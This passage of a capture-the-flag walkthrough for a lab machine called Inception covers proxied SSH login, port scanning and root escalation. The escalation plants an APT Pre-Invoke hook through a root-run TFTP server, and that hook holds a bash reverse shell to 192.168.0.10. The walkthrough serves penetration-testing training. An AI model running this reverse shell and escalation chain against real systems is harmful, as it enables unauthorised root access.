tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::3128                 :::*                    LISTEN      -               
udp        0      0 0.0.0.0:45347           0.0.0.0:*                           -               
udp6       0      0 :::36360                :::*                                -               
```

- So let's use `squid` to test the creds
  - Using creds to login as `coby` via `proxychains` works
```
└─$ proxychains sshpass -p 'VwPddNh7xMZyDQoByQL4' ssh cobb@127.0.0.1
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ 

```

## Container Root
- `sudo`
```
cobb@Inception:~$ sudo -l
[sudo] password for cobb: 
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL

```
```
cobb@Inception:~$ sudo su
root@Inception:/home/cobb# 
```
## Root
- Since we are inside container, let's perform a ping sweep
```
root@Inception:/home/cobb# for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &); done
64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.068 ms
64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.039 ms
```

- We can enumerate ports using 2 methods
```
root@Inception:/home/cobb# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused
Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
```
```
root@Inception:/home/cobb# for i in {1..65535}; do (echo > /dev/tcp/192.168.0.1/$i) >/dev/null 2>&1 && echo "$i is open"; done
21 is open
22 is open
53 is open
```

- We have `ftp`, `ssh` and `dns` ports open
  - Let's start with `ftp`
```
root@Inception:/home/cobb# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 10  2022 bin
drwxr-xr-x    3 0        0            4096 Aug 10  2022 boot
drwxr-xr-x   18 0        0            3780 Oct 23 16:18 dev
drwxr-xr-x   93 0        0            4096 Aug 10  2022 etc
drwxr-xr-x    3 0        0            4096 Aug 10  2022 home
lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -> boot/initrd.img-4.4.0-101-generic
drwxr-xr-x   22 0        0            4096 Aug 10  2022 lib
drwxr-xr-x    2 0        0            4096 Aug 10  2022 lib64
drwx------    2 0        0           16384 Oct 30  2017 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
drwxr-xr-x    2 0        0            4096 Aug 10  2022 mnt
drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
dr-xr-xr-x  221 0        0               0 Oct 23 16:18 proc
drwx------    6 0        0            4096 Aug 10  2022 root
drwxr-xr-x   26 0        0             900 Oct 23 16:18 run
drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
drwxr-xr-x    2 0        0            4096 Aug 10  2022 snap
drwxr-xr-x    3 0        0            4096 Aug 10  2022 srv
dr-xr-xr-x   13 0        0               0 Oct 23 17:04 sys
drwxrwxrwt   10 0        0            4096 Oct 23 17:25 tmp
drwxr-xr-x   10 0        0            4096 Aug 10  2022 usr
drwxr-xr-x   13 0        0            4096 Aug 10  2022 var
lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
226 Directory send OK.

```

- We can't write
  - So let's continue enumeration
  - We can `ssh` as `cobb` to host machine
```
oot@Inception:/home/cobb# ssh cobb@192.168.0.1
The authenticity of host '192.168.0.1 (192.168.0.1)' can't be established.
ECDSA key fingerprint is SHA256:zj8NiAd9po8KKA/z7MGKjn7j6wPFpA2Y6bDTRecUrdE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.1' (ECDSA) to the list of known hosts.
cobb@192.168.0.1's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

cobb@Inception:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:04:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.67/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:467/64 scope global mngtmpaddr dynamic 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb9:467/64 scope link 
       valid_lft forever preferred_lft forever
3: lxdbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fe:a2:b8:a9:45:e7 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.1/24 scope global lxdbr0
       valid_lft forever preferred_lft forever
    inet6 fe80::d864:a1ff:fe41:8ff/64 scope link 
       valid_lft forever preferred_lft forever
5: vethD0K6BC@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master lxdbr0 state UP group default qlen 1000
    link/ether fe:a2:b8:a9:45:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fca2:b8ff:fea9:45e7/64 scope link 
       valid_lft forever preferred_lft forever
```

- We see a cronjob every 5 min is executed 
```
cobb@Inception:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null

```

- By the way we have a `tftpd` 
  - If we scanned `udp`, we would've noticed it 
    - `nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused`
```
cobb@Inception:~$ ls -lha /etc/init.d/
total 316K
drwxr-xr-x  2 root root 4.0K Aug 10  2022 .
...
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1.1K Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4.0K Mar 16  2017 ssh
-rwxr-xr-x  1 root root 2.1K Mar 24  2017 tftpd-hpa
...
```
```
cobb@Inception:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.0.1:53          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 fe80::d864:a1ff:fe41:53 :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:2682            0.0.0.0:*                           -               
udp        0      0 192.168.0.1:53          0.0.0.0:*                           -               
udp        0      0 0.0.0.0:67              0.0.0.0:*                           -               
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
udp6       0      0 fe80::d864:a1ff:fe41:53 :::*                                -               
udp6       0      0 :::69                   :::*                                -    
```

- Back to the cronjob
  - We saw that `apt update` is executed every 5 minutes
  - We can create a config file with `Pre-Invoke` containing reverse shell
    - https://gtfobins.github.io/gtfobins/apt-get/
  - But we also need to place our config inside `/etc/apt/apt.conf.d/`
  - This is where `tftpd` will help us
    - Since it is running as `root`
  - Check `/etc/default`
```
TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
```

- Let's create a config and place it via `tftpd`
  - Create a file with `APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/192.168.0.10/6666 0>&1'"}`
```
root@Inception:/home/cobb# tftp 192.168.0.1
tftp> put /home/cobb/rooted /etc/apt/apt.conf.d/rooted
Sent 77 bytes in 0.0 seconds
```
```
cobb@Inception:~$ ls -lha /etc/apt/apt.conf.d/
total 56K
drwxr-xr-x 2 root root 4.0K Oct 23 17:43 .
drwxr-xr-x 6 root root 4.0K Aug 10  2022 ..
-rw-r--r-- 1 root root   49 Oct 30  2017 00aptitude
-rw-r--r-- 1 root root   82 Oct 30  2017 00CDMountPoint
-rw-r--r-- 1 root root   40 Oct 30  2017 00trustcdrom
-rw-r--r-- 1 root root  769 Apr 14  2016 01autoremove
-r--r--r-- 1 root root 2.9K Aug 10  2022 01autoremove-kernels
-rw-r--r-- 1 root root   42 Apr 14  2016 01-vendor-ubuntu
-rw-r--r-- 1 root root  129 May 24  2016 10periodic
-rw-r--r-- 1 root root  108 May 24  2016 15update-stamp
-rw-r--r-- 1 root root   85 May 24  2016 20archive
-rw-r--r-- 1 root root  182 Nov 10  2015 70debconf
-rw-r--r-- 1 root root  305 May 24  2016 99update-notifier
-rw-rw-rw- 1 root root   76 Oct 23 17:43 rooted

```

- After few minutes, we receive our shell
```
root@Inception:/home/cobb# nc -lvnp 6666
Listening on [0.0.0.0] (family 0, port 6666)
Connection from [192.168.0.1] port 6666 [tcp/*] accepted (family 2, sport 33834)
bash: cannot set terminal process group (13877): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp#
```